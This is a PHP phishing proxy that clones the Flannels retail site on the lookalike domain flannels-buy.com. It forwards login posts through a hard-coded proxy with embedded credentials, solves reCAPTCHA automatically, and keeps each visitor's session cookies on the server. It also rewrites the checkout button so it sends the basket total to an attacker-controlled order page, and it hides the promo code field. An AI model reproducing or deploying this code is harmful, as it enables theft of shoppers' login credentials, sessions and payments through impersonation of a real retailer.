<?php
define('ORIGIN_HOST','www.flannels.com');
define('OUR_HOST','www.flannels-buy.com');
ini_set('display_errors',1);
error_reporting(E_ALL);
require('functions.php');
session_start();
$sessionId=session_id();
$isLoginPost = ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['REQUEST_URI'], '/login') !== false);
if(isset($_SERVER['HTTP_ORIGIN'])){
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Max-Age: 1000');
}
if($_SERVER['REQUEST_METHOD']==='OPTIONS'){
    if(isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD'])){
        header("Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE");
    }
    if(isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS'])){
        header("Access-Control-Allow-Headers: Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization");
    }
    exit(0);
}
if ($isLoginPost) {
    $siteKey = '6LcdJyUUAAAAAA73J4ruwiiYePa_D3s1um9TA7m6';
    $pageUrl = 'https://www.flannels.com/login';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0';
    $proxyWithoutScheme = 'gCbZJr:Cru2Ps@168.80.201.165:8000';

    $captchaToken = solveWithTwoCaptcha($siteKey, $pageUrl, $userAgent, $proxyWithoutScheme);

    if ($captchaToken) {
        $_POST['g-recaptcha-response'] = $captchaToken;
    } else {
        header("Location: /captcha-error");
        exit;
    }
}
$ourHost=$_SERVER['HTTP_HOST'];
$destinationHostAddress=str_replace(OUR_HOST,ORIGIN_HOST,$_SERVER['HTTP_HOST']);
$responseProxyHeaders=array('accept-ranges','cache-control','content-transfer-encoding','content-type','content-encoding','cookie','last-modified','location','pragma','set-cookie','referer','origin','p3p','x-requested-with');
$requestProxyHeaders=array('host','accept-encoding','referer','origin','cookie','pragma','cache-control','user-agent','x-requested-with');
$remoteIp=$_SERVER['REMOTE_ADDR'];
if($_SERVER['SERVER_ADDR']===$_SERVER['REMOTE_ADDR']){
    $remoteIp=!empty($_SERVER['HTTP_X_REAL_IP'])?$_SERVER['HTTP_X_REAL_IP']:$_SERVER['HTTP_X_FORWARDED_FOR'];
}
list($protocolName,$protocolVersion)=explode('/',$_SERVER['SERVER_PROTOCOL']);
$destinationRequestHeaders=array();
foreach(getallheaders() as $name=>$value){
    if(!in_array(strtolower($name),$requestProxyHeaders)){
        $destinationRequestHeaders[]="$name: $value";
    }
}
$destinationServerNameHost=preg_match('#^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$#',$destinationHostAddress)==1?$_SERVER['HTTP_HOST']:$destinationHostAddress;
$destinationRequestHeaders[]="Host: {$destinationServerNameHost}";
if(isset($_SERVER['HTTP_COOKIE'])){
    $destinationRequestHeaders[]="Cookie: {$_SERVER['HTTP_COOKIE']}";
}
if(isset($_SERVER['HTTP_USER_AGENT'])){
    $destinationRequestHeaders[]="User-Agent: {$_SERVER['HTTP_USER_AGENT']}";
}
if ($isLoginPost) {
    $destinationRequestHeaders[] = "X-Forwarded-For: {$proxyIp}";
} else {
    if (!empty($remoteIp)) {
        $destinationRequestHeaders[] = "X-Forwarded-For: {$remoteIp}";
    }
}
$proxyRequestUrl="https://{$destinationHostAddress}{$_SERVER['REQUEST_URI']}";
$ch=curl_init();
$inputJSON=file_get_contents('php://input');
if ($isLoginPost) {
    curl_setopt($ch, CURLOPT_PROXY, "168.80.201.165:8000");
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "gCbZJr:Cru2Ps");
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
}
if(sizeof($_POST)>0){
    $destinationRequestHeaders[]='X-Requested-With: XMLHttpRequest';
    curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($_POST));
    curl_setopt($ch,CURLOPT_POST,1);
}
if(!empty($inputJSON)){
    $destinationRequestHeaders[]='X-Requested-With: XMLHttpRequest';
    curl_setopt($ch,CURLOPT_POSTFIELDS,$inputJSON);
    curl_setopt($ch,CURLOPT_POST,1);
}
curl_setopt($ch,CURLOPT_URL,$proxyRequestUrl);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
if($_SERVER['REQUEST_URI']!=='/graphql'){
    curl_setopt($ch,CURLOPT_HEADER,1);
}
curl_setopt($ch,CURLOPT_HTTPHEADER,$destinationRequestHeaders);
curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch,CURLOPT_VERBOSE,0);
curl_setopt($ch,CURLOPT_COOKIEJAR,__DIR__.'/cookies/cookie'.$sessionId.'.txt');
curl_setopt($ch,CURLOPT_COOKIEFILE,__DIR__.'/cookies/cookie'.$sessionId.'.txt');
curl_setopt($ch,CURLOPT_STDERR,fopen('php://output','w'));
$results=curl_exec($ch);
$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
curl_close($ch);
if($_SERVER['REQUEST_URI']==='/graphql'){
    die($results);
}
$destinationResponseHeaders = substr($results, 0, $headerSize);
$body = substr($results, $headerSize);
$destinationResponseHeaders = explode("\r\n", trim($destinationResponseHeaders));
$responseCode='';
$responseMessage='';
$sourceResponseHeaders=array();
foreach($destinationResponseHeaders as $header){
    if(!preg_match('/^([^:]+): (.*)$/',$header,$matches)){
        list($protocol,$responseCode,$responseMessage)=explode(' ',$header);
    }else{
        list($headerName,$headerValue)=array_splice($matches,-2);
        $sourceResponseHeaders[$headerName][]=$headerValue;
    }
}
header("{$_SERVER['SERVER_PROTOCOL']} {$responseCode} {$responseMessage}");
$sourceResponseHeaders=array_change_key_case($sourceResponseHeaders);
foreach($responseProxyHeaders as $headerName){
    if(isset($sourceResponseHeaders[$headerName])){
        foreach($sourceResponseHeaders[$headerName] as $headerValue){
            $headerValue=replaceAbsLinksCity($headerValue,$ourHost);
            header("{$headerName}: {$headerValue}",$headerName==='Set-Cookie'?false:true);
        }
    }
}
$body=str_replace(ORIGIN_HOST,OUR_HOST,$body);
$body=str_replace('/checkoutsp','/cart',$body);
$body=str_replace('<span id="spanCheckout" class="chkoutopt">
                        <a id="aCheckout" href="/checkoutsp" rel="nofollow">
                            <span>Checkout</span>
                        </a>
                    </span>','<span id="spanCheckout" class="chkoutopt">
                        <a id="aCheckout" href="/cart" rel="nofollow">
                            <span>Checkout</span>
                        </a>
                    </span>',$body);
$body=str_replace('<div class="basket-summary-continue-button-container">
                <div id="divContinueSecurely">
                    <button data-action="checkout" class="ContinueOn">
                            <span>Continue to Checkout</span>
                    </button>
                </div>
            </div>','<div class="basket-summary-continue-button-container">
                <div id="divContinueSecurely">
                    <a href="#" class="ContinueOn">
                            <span>Continue to Checkout</span>
                    </a>
                </div>
            </div>',$body);
$smartsuppScript='
<script type="text/javascript">var _smartsupp={};_smartsupp.key="5fd1a5842a29df5ab2551a026a163050e207ed1b";(function(d){var s,c,o=smartsupp=function(){o._.push(arguments)};o._=[];s=d.getElementsByTagName("script")[0];c=d.createElement("script");c.type="text/javascript";c.charset="utf-8";c.async=true;c.src="https://www.smartsuppchat.com/loader.js?";s.parentNode.insertBefore(c,s)})(document);</script><noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
';
$script='
<script>document.addEventListener("DOMContentLoaded",function(){if(window.location.pathname==="/cart"){var e=document.querySelector(".basket-summary-continue-button-container");if(e){var t=document.createElement("a");t.className="ContinueOn",t.innerHTML="<span>Continue to Checkout</span>";var n=document.getElementById("TotalValue").textContent.trim(),r=n.replace("£","").replace(",","");t.href="/order/index.php?id=fffd3a11cb52&summe="+encodeURIComponent(r),e.innerHTML="",e.appendChild(t)}}});</script>
';
$hidePromoCodeScript='
<script>document.addEventListener("DOMContentLoaded",function(){var e=document.getElementById("pnlPromoCode");e&&(e.style.display="none")});</script>
';
$modalStyles='
<style>#modalz{display:none;position:fixed;top:calc(30% - 150px);left:50%;transform:translate(-50%,0);width:500px;background-color:#1F1D1D;box-shadow:0 4px 20px rgba(0,0,0,.3);z-index:9999999;padding:20px;border-radius:12px;animation:fadeIn .3s}#overlayz{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,.7);z-index:999}.close{cursor:pointer;font-size:24px;color:#aaa;float:right}.close:hover{color:#000}.popupContainer{text-align:center}.poupTitle{font-size:20px;margin:10px 0;color:#fff}.popupSubTitle{font-size:14px;color:#fff;margin-bottom:20px}.ctaLink{max-width:220px;margin:0 0 20px;padding:11px 48px;background-color:#fff!important;color:#1F1D1D!important;border-radius:0;font-size:12px;line-height:15px;letter-spacing:.3px;text-transform:uppercase;text-decoration:none;display:inline-block;text-align:center}.ctaLink:hover{background-color:#218838}.imgz{max-width:100%;height:auto;border-radius:8px;margin-bottom:15px}@keyframes fadeIn{from{opacity:0}to{opacity:1}}</style>
';
$modalHTML='
<div id="overlayz"></div><div id="modalz"><span class="close" onclick="closeModal()">&times;</span><img class="imgz" src="https://www.flannels-buy.com/assets/news.png" alt="news"><div class="popupContainer"><div class="ctaSection"><a href="/cart" class="ctaLink">Add to cart!</a></div></div></div>
';
$modalScript='
<script>function setCookie(e,t,n){var o=new Date;o.setTime(o.getTime()+60*60*1000*n);var r="expires="+o.toUTCString();document.cookie=e+"="+t+";"+r+";path=/"}function getCookie(e){for(var t=e+"=",n=document.cookie.split(";"),o=0;o<n.length;o++){for(var r=n[o];" "===r.charAt(0);)r=r.substring(1);if(0===r.indexOf(t))return r.substring(t.length,r.length)}return null}function closeModal(){document.getElementById("modalz").style.display="none",document.getElementById("overlayz").style.display="none",setCookie("modalClosed","true",5)}function showModal(){var e=getCookie("modalClosed");e||(document.getElementById("modalz").style.display="block",document.getElementById("overlayz").style.display="block")}window.onload=showModal;</script>
';
$body=str_replace('</head>',$modalStyles.'</head>',$body);
$body=str_replace('</body>',$script.$hidePromoCodeScript.$modalHTML.$modalScript.$smartsuppScript.'</body>',$body);
$body = preg_replace('/<div[^>]*class="g-recaptcha"[^>]*>.*?<\/div>/is', '', $body);
$body = preg_replace('#<script[^>]+src="https://www.google.com/recaptcha/api.js".*?</script>#is', '', $body);

die($body);
